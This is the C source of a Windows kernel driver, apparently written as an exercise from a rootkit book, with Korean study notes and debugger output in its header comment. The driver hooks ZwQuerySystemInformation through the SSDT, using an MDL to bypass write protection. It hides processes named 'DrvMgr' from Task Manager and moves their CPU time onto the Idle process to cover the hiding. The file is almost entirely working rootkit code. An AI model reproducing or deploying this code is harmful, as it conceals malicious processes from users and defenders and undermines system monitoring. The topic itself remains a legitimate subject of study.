
/*++
    2012. 9. 26
    
    HideProcessHookMDL
    - 루트킷 109p 
    - taskmgr.exe는 ZwQuerySystemInformation을 이용 프로세스 리스트 정보를 구한다
    - SSDT 훅

    Prerequisite
    - SSDT, KeServiceDescriptorTable(ntoskrnl.exe)
      KeServiceDescriptorTableShadow(win32k.sys, USER,GDI 서비스의 주소)
    - SSDT의 메모리 보호 해제(CR0 Trick or MDL)
      MDL
      1. SSDT의 베이스 주소와 크기를 얻는다
      2. SSDT영역을 표현해주는 MDL을 non-paged pool 메모리 영역에 만든다(MmCreateMdl, MmBuildMdlForNonPagedPool)
      3. 생성한 MDL 플래그 값을 MDL_MAPPED_TO_SYSTEM_VA값과 OR연산한다
      4. MmMapLockedPages 함수 호출
    - Zw*함수 안의 코드
      Zw*함수의 opcode 시작은 해당 함수의 인덱스 번호를 이용해 동작
      move eax, ULONG   (ULONG은 SSDT에서의 인덱스 번호)
      인덱스 번호는 opcode의 두번째 바이트 부분에 존재
    - InterlockedExchange
    - ZwQuerySystemInformation
       프로세스와 스레드 정보 구하기
       작업관리자는 이 함수를 이용해 프로세스 리스트 정보를 구함(SystemInformationClass, 5)


    reference
       http://vbdream.tistory.com/entry/SSDT-Hooking-2-SSDT%EB%A5%BC-%EC%A1%B0%EC%9E%91%ED%95%98%EB%A0%A4%EB%A9%B4-%EC%96%B4%EB%96%A4-%EB%B0%A9%EB%B2%95%EC%9D%84-%EC%82%AC%EC%9A%A9%ED%95%B4%EC%95%BC%ED%95%A9%EB%8B%88%EA%B9%8C

       0: kd> u nt!zwquerysysteminformation
       nt!ZwQuerySystemInformation:
       804e5ff6 b8ad000000      mov     eax,0ADh
       804e5ffb 8d542404        lea     edx,[esp+4]
       804e5fff 9c              pushfd
       804e6000 6a08            push    8
       804e6002 e8ba97ffff      call    nt!KiSystemService (804df7c1)
       804e6007 c21000          ret     10h
       nt!ZwQuerySystemTime:
       804e600a b8ae000000      mov     eax,0AEh
       804e600f 8d542404        lea     edx,[esp+4]

       런타임디버깅
        - sxe ld hideprocess.sys
        - bp hideprocess!DriverEntry
        - sxr : reset filter settings to default values
 --*/

#include <ntddk.h>
//#include "nativeAPI.h"   // driver : include파일 포함시키기.... 런타임 디버깅


#pragma pack(1)
typedef struct ServiceDescriptorEntry {
    unsigned int *ServiceTableBase;
    unsigned int *ServiceCounterTableBase; //Used only in checked build
    unsigned int NumberOfServices;
    unsigned char *ParamTableBase;
} ServiceDescriptorTableEntry_t, *PServiceDescriptorTableEntry_t;
#pragma pack()


// Zw*함수와 SSDT의 Nt*함수는 일대일 대응 아님

// ntoskernl.exe에서 제공하는 Zw*함수의 주소를 입력 받아 그에 상응하는 SSDT에서의 Nt*함수의 주소를 얻음
#define SYSTEMSERVICE(_function)  KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)_function+1)]
// Zw*함수의 주소를 입력 받아 해당 함수의 SSDT에서의 인덱스 번호를 구한다
#define SYSCALL_INDEX(_Function) *(PULONG)((PUCHAR)_Function+1)
// _Function은 Zw*함수 주소
#define HOOK_SYSCALL(_Function, _Hook, _Orig )  \
    _Orig = (PVOID) InterlockedExchange( (PLONG) &MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)
#define UNHOOK_SYSCALL(_Function, _Hook, _Orig )  \
    InterlockedExchange( (PLONG) &MappedSystemCallTable[SYSCALL_INDEX(_Function)], (LONG) _Hook)

typedef enum _SYSTEM_INFORMATION_CLASS {
    SystemBasicInformation = 0,
    SystemPerformanceInformation = 2,
    SystemTimeOfDayInformation = 3,
    SystemProcessInformation = 5,
    SystemProcessorPerformanceInformation = 8,
    SystemInterruptInformation = 23,
    SystemExceptionInformation = 33,
    SystemRegistryQuotaInformation = 37,
    SystemLookasideInformation = 45
} SYSTEM_INFORMATION_CLASS;


struct _SYSTEM_THREADS
{
    LARGE_INTEGER           KernelTime;
    LARGE_INTEGER           UserTime;
    LARGE_INTEGER           CreateTime;
    ULONG                           WaitTime;
    PVOID                           StartAddress;
    CLIENT_ID                       ClientIs;
    KPRIORITY                       Priority;
    KPRIORITY                       BasePriority;
    ULONG                           ContextSwitchCount;
    ULONG                           ThreadState;
    KWAIT_REASON            WaitReason;
};

struct _SYSTEM_PROCESSES
{
    ULONG                           NextEntryDelta;
    ULONG                           ThreadCount;
    ULONG                           Reserved[6];
    LARGE_INTEGER           CreateTime;
    LARGE_INTEGER           UserTime;
    LARGE_INTEGER           KernelTime;
    UNICODE_STRING          ProcessName;
    KPRIORITY                       BasePriority;
    ULONG                           ProcessId;
    ULONG                           InheritedFromProcessId;
    ULONG                           HandleCount;
    ULONG                           Reserved2[2];
    VM_COUNTERS                     VmCounters;
    IO_COUNTERS                     IoCounters; //windows 2000 only
    struct _SYSTEM_THREADS          Threads[1];
};

// Added by Creative of rootkit.com
struct _SYSTEM_PROCESSOR_TIMES
{
    LARGE_INTEGER					IdleTime;
    LARGE_INTEGER					KernelTime;
    LARGE_INTEGER					UserTime;
    LARGE_INTEGER					DpcTime;
    LARGE_INTEGER					InterruptTime;
    ULONG							InterruptCount;
};


NTSYSAPI
NTSTATUS
NTAPI
ZwQuerySystemInformation(
                         IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
                         OUT PVOID SystemInformation,
                         IN ULONG SystemInformationLength,
                         OUT PULONG ReturnLength OPTIONAL
                         );

typedef 
NTSYSAPI
NTSTATUS
(NTAPI
*ZWQUERYSYSTEMINFORMATION)(
                         IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
                         OUT PVOID SystemInformation,
                         IN ULONG SystemInformationLength,
                         OUT PULONG ReturnLength OPTIONAL
                         );

ZWQUERYSYSTEMINFORMATION OldZwQuerySystemInformation;

LARGE_INTEGER m_UserTime;
LARGE_INTEGER m_KernelTime;
__declspec(dllimport)  ServiceDescriptorTableEntry_t KeServiceDescriptorTable;
PMDL  g_pmdlSystemCall;
PVOID *MappedSystemCallTable;


NTSTATUS NewZwQuerySystemInformation(
                                     IN ULONG SystemInformationClass,
                                     IN PVOID SystemInformation,
                                     IN ULONG SystemInformationLength,
                                     OUT PULONG ReturnLength)
{
    NTSTATUS ntStatus;

    ntStatus = OldZwQuerySystemInformation(SystemInformationClass, SystemInformation, 
                                                SystemInformationLength, ReturnLength);

    if(NT_SUCCESS(ntStatus))
    {
        if(SystemInformationClass == SystemProcessInformation)
        {
            struct _SYSTEM_PROCESSES *curr = (struct _SYSTEM_PROCESSES*)SystemInformation;
            struct _SYSTEM_PROCESSES *prev = NULL;

            while(curr)
            {
                if(curr->ProcessName.Buffer != NULL)
                {
                    if(memcmp(curr->ProcessName.Buffer, L"DrvMgr", wcslen(L"DrvMgr")) == 0)
                    {
                        m_UserTime.QuadPart += curr->UserTime.QuadPart;
                        m_KernelTime.QuadPart += curr->KernelTime.QuadPart;

                        if(prev) // Middle or Last entry
                        {
                            if(curr->NextEntryDelta)
                                prev->NextEntryDelta += curr->NextEntryDelta;
                            else	// we are last, so make prev the end
                                prev->NextEntryDelta = 0;
                        }
                        else
                        {
                            if(curr->NextEntryDelta)
                            {
                                // we are first in the list, so move it forward
                                (char *)SystemInformation += curr->NextEntryDelta;
                            }
                            else // we are the only process!
                                SystemInformation = NULL;
                        }
                    }
                }
                else    // This is the entry for the Idle process
                {
                    curr->UserTime.QuadPart += m_UserTime.QuadPart;
                    curr->KernelTime.QuadPart += m_KernelTime.QuadPart;

                    m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;
                }

                prev= curr;
                if(curr->NextEntryDelta)
                    (char*)curr += curr->NextEntryDelta;
                else
                    curr = NULL;
            }
        }
        else if(SystemInformationClass == SystemProcessorPerformanceInformation)  // Query for SystemProcessorTimes
        {
            struct _SYSTEM_PROCESSOR_TIMES *times = (struct _SYSTEM_PROCESSOR_TIMES*)SystemInformation;
            times->IdleTime.QuadPart += m_UserTime.QuadPart + m_KernelTime.QuadPart;
        }
    }

    return ntStatus;
}


VOID OnUnload(IN PDRIVER_OBJECT DriverObject)
{
    DbgPrint("HideProcessHookMDL OnUnload called\n");

    UNHOOK_SYSCALL(ZwQuerySystemInformation, OldZwQuerySystemInformation, NewZwQuerySystemInformation);

    if(g_pmdlSystemCall)
    {
        MmUnmapLockedPages(MappedSystemCallTable, g_pmdlSystemCall);
        IoFreeMdl(g_pmdlSystemCall);
    }
}


NTSTATUS DriverEntry(IN PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{
   
    DriverObject->DriverUnload = OnUnload;

    m_UserTime.QuadPart = m_KernelTime.QuadPart = 0;

    OldZwQuerySystemInformation = (ZWQUERYSYSTEMINFORMATION)(SYSTEMSERVICE(ZwQuerySystemInformation));

    g_pmdlSystemCall = MmCreateMdl(NULL, KeServiceDescriptorTable.ServiceTableBase, KeServiceDescriptorTable.NumberOfServices*4);
    if(!g_pmdlSystemCall)
        return STATUS_UNSUCCESSFUL;

    MmBuildMdlForNonPagedPool(g_pmdlSystemCall);

    g_pmdlSystemCall->MdlFlags = g_pmdlSystemCall->MdlFlags | MDL_MAPPED_TO_SYSTEM_VA;

    MappedSystemCallTable = MmMapLockedPages(g_pmdlSystemCall, KernelMode);

    HOOK_SYSCALL(ZwQuerySystemInformation, NewZwQuerySystemInformation, OldZwQuerySystemInformation);


    DbgPrint("HideProcessHookMDL complete : old %08x -> new %08x\n", OldZwQuerySystemInformation, ZwQuerySystemInformation);

    return STATUS_SUCCESS;
}
